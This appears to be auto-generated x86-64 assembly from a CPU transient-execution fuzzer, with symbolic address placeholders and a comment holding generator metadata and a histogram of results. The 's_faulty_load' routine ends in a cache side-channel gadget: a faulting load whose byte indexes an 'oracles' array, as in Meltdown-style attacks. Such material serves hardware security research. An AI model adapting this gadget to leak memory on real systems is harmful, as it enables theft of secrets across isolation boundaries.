.global s_prepare_buffers
s_prepare_buffers:
push %r10
push %r12
push %r14
push %r9
push %rbp
push %rcx
push %rdi
push %rsi
lea addresses_WT_ht+0x8aa, %rcx
nop
nop
nop
nop
xor %rbp, %rbp
mov (%rcx), %r12d
cmp $22380, %rbp
lea addresses_normal_ht+0x307a, %rcx
clflush (%rcx)
add $43628, %rdi
movl $0x61626364, (%rcx)
add %rbp, %rbp
lea addresses_UC_ht+0x16ea8, %r10
nop
nop
inc %r9
movl $0x61626364, (%r10)
nop
nop
nop
add $59794, %rdi
lea addresses_normal_ht+0xfe7a, %rbp
clflush (%rbp)
nop
nop
add $61987, %r14
mov $0x6162636465666768, %rcx
movq %rcx, (%rbp)
nop
nop
nop
nop
add $32126, %rbp
lea addresses_WT_ht+0x143ae, %r12
nop
nop
dec %rbp
vmovups (%r12), %ymm6
vextracti128 $0, %ymm6, %xmm6
vpextrq $1, %xmm6, %r10
nop
nop
nop
xor %rcx, %rcx
lea addresses_A_ht+0x3752, %rcx
nop
nop
nop
dec %rbp
and $0xffffffffffffffc0, %rcx
movntdqa (%rcx), %xmm7
vpextrq $0, %xmm7, %r9
nop
nop
nop
cmp $7835, %r9
lea addresses_WC_ht+0xbdda, %rcx
nop
nop
add $49517, %r14
movb $0x61, (%rcx)
nop
nop
nop
dec %rcx
lea addresses_D_ht+0x13ca9, %rsi
lea addresses_WT_ht+0x17d7a, %rdi
nop
nop
inc %r14
mov $6, %rcx
rep movsq
nop
dec %r14
lea addresses_A_ht+0x15b7a, %rdi
clflush (%rdi)
nop
nop
nop
nop
nop
cmp %r12, %r12
movb (%rdi), %r14b
nop
sub %rbp, %rbp
lea addresses_UC_ht+0x1567a, %r9
nop
nop
nop
nop
nop
add %rcx, %rcx
movups (%r9), %xmm6
vpextrq $1, %xmm6, %r12
sub %r12, %r12
pop %rsi
pop %rdi
pop %rcx
pop %rbp
pop %r9
pop %r14
pop %r12
pop %r10
ret

    .global s_faulty_load
s_faulty_load:
push %r15
push %r9
push %rax
push %rbp
push %rbx
push %rdi
push %rdx

// Load
mov $0xe7a, %rdi
clflush (%rdi)
nop
nop
nop
nop
nop
sub $63842, %r15
mov (%rdi), %edx
nop
nop
cmp %rbx, %rbx

// Store
lea addresses_UC+0x11f4c, %rdx
nop
inc %r9
mov $0x5152535455565758, %rdi
movq %rdi, %xmm4
movaps %xmm4, (%rdx)
nop
nop
xor %rdi, %rdi

// Store
lea addresses_RW+0x13ea2, %rbx
nop
nop
nop
and $5561, %r15
mov $0x5152535455565758, %rax
movq %rax, (%rbx)
nop
nop
nop
nop
sub $42614, %rax

// Store
lea addresses_WT+0x222a, %rdi
nop
nop
nop
nop
nop
xor %rdx, %rdx
mov $0x5152535455565758, %rbx
movq %rbx, %xmm5
movups %xmm5, (%rdi)
nop
nop
add $39045, %rdi

// Store
lea addresses_D+0x1e0d8, %rbp
clflush (%rbp)
nop
nop
nop
nop
nop
sub %rdi, %rdi
mov $0x5152535455565758, %rbx
movq %rbx, (%rbp)
nop
nop
inc %r9

// Store
mov $0xaba, %rbp
nop
nop
nop
nop
nop
xor $7742, %rbx
mov $0x5152535455565758, %rax
movq %rax, %xmm4
vmovups %ymm4, (%rbp)
nop
nop
nop
nop
nop
inc %rdx

// Store
lea addresses_normal+0x124fa, %r9
clflush (%r9)
nop
add %rdx, %rdx
mov $0x5152535455565758, %rdi
movq %rdi, %xmm1
movups %xmm1, (%r9)
nop
xor $19557, %rdi

// Store
lea addresses_RW+0x1ba7a, %r9
nop
and $14634, %rdx
mov $0x5152535455565758, %rax
movq %rax, (%r9)
nop
nop
nop
nop
nop
sub $35393, %r9

// Faulty Load
lea addresses_RW+0x1727a, %rbp
nop
nop
add %r9, %r9
mov (%rbp), %eax
lea oracles, %rdi
and $0xff, %rax
shlq $12, %rax
mov (%rdi,%rax,1), %rax
pop %rdx
pop %rdi
pop %rbx
pop %rbp
pop %rax
pop %r9
pop %r15
ret

/*
<gen_faulty_load>
[REF]
{'OP': 'LOAD', 'src': {'same': False, 'NT': False, 'AVXalign': False, 'size': 1, 'type': 'addresses_RW', 'congruent': 0}}
{'OP': 'LOAD', 'src': {'same': False, 'NT': False, 'AVXalign': False, 'size': 4, 'type': 'addresses_P', 'congruent': 10}}
{'dst': {'same': False, 'NT': False, 'AVXalign': True, 'size': 16, 'type': 'addresses_UC', 'congruent': 1}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': True, 'size': 8, 'type': 'addresses_RW', 'congruent': 3}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 16, 'type': 'addresses_WT', 'congruent': 4}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 8, 'type': 'addresses_D', 'congruent': 1}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 32, 'type': 'addresses_P', 'congruent': 5}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 16, 'type': 'addresses_normal', 'congruent': 7}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 8, 'type': 'addresses_RW', 'congruent': 11}, 'OP': 'STOR'}
[Faulty Load]
{'OP': 'LOAD', 'src': {'same': True, 'NT': False, 'AVXalign': False, 'size': 4, 'type': 'addresses_RW', 'congruent': 0}}
<gen_prepare_buffer>
{'OP': 'LOAD', 'src': {'same': False, 'NT': True, 'AVXalign': False, 'size': 4, 'type': 'addresses_WT_ht', 'congruent': 3}}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 4, 'type': 'addresses_normal_ht', 'congruent': 7}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': True, 'size': 4, 'type': 'addresses_UC_ht', 'congruent': 1}, 'OP': 'STOR'}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 8, 'type': 'addresses_normal_ht', 'congruent': 10}, 'OP': 'STOR'}
{'OP': 'LOAD', 'src': {'same': False, 'NT': False, 'AVXalign': False, 'size': 32, 'type': 'addresses_WT_ht', 'congruent': 2}}
{'OP': 'LOAD', 'src': {'same': True, 'NT': True, 'AVXalign': False, 'size': 16, 'type': 'addresses_A_ht', 'congruent': 1}}
{'dst': {'same': False, 'NT': False, 'AVXalign': False, 'size': 1, 'type': 'addresses_WC_ht', 'congruent': 5}, 'OP': 'STOR'}
{'dst': {'same': False, 'congruent': 8, 'type': 'addresses_WT_ht'}, 'OP': 'REPM', 'src': {'same': False, 'congruent': 0, 'type': 'addresses_D_ht'}}
{'OP': 'LOAD', 'src': {'same': False, 'NT': False, 'AVXalign': False, 'size': 1, 'type': 'addresses_A_ht', 'congruent': 6}}
{'OP': 'LOAD', 'src': {'same': False, 'NT': False, 'AVXalign': False, 'size': 16, 'type': 'addresses_UC_ht', 'congruent': 10}}
{'32': 20889}
32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32 32
*/
